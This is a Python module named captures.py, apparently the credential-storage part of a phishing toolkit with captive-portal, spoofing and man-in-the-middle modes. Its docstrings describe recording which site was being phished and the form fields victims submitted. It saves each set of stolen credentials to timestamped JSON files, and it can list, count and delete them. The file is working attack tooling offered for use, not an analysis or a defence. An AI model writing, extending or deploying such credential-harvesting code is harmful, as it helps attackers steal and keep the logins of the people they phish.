"""captures.py - Credential capture storage."""

import json
import os
import time

CAPTURES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captures')


def save(host, fields, source='portal'):
    """Persist a captured credential set to disk.

    Args:
        host: requested Host: header (which site was being phished)
        fields: dict of form fields the victim submitted
        source: which mode captured it (portal/spoof/mitm)
    Returns the saved file path.
    """
    try:
        os.makedirs(CAPTURES_DIR, exist_ok=True)
        ts = time.strftime('%Y%m%d_%H%M%S')
        ms = int((time.time() % 1) * 1000)
        fname = f'{ts}_{ms:03d}_{(host or "unknown").replace(":", "_")}.json'
        path = os.path.join(CAPTURES_DIR, fname)
        with open(path, 'w') as f:
            json.dump({
                'timestamp': time.time(),
                'host': host,
                'source': source,
                'fields': fields,
            }, f, indent=2)
        return path
    except Exception:
        return None


def list_recent(limit=50):
    """Return a list of recent capture dicts, newest first."""
    try:
        files = sorted(os.listdir(CAPTURES_DIR), reverse=True)
    except Exception:
        return []
    out = []
    for name in files[:limit]:
        try:
            with open(os.path.join(CAPTURES_DIR, name)) as f:
                out.append(json.load(f))
        except Exception:
            continue
    return out


def count():
    try:
        return sum(1 for f in os.listdir(CAPTURES_DIR) if f.endswith('.json'))
    except Exception:
        return 0


def clear_all():
    """Delete every saved capture. Returns the number removed."""
    removed = 0
    try:
        for f in os.listdir(CAPTURES_DIR):
            if f.endswith('.json'):
                try:
                    os.unlink(os.path.join(CAPTURES_DIR, f))
                    removed += 1
                except Exception:
                    pass
    except Exception:
        pass
    return removed
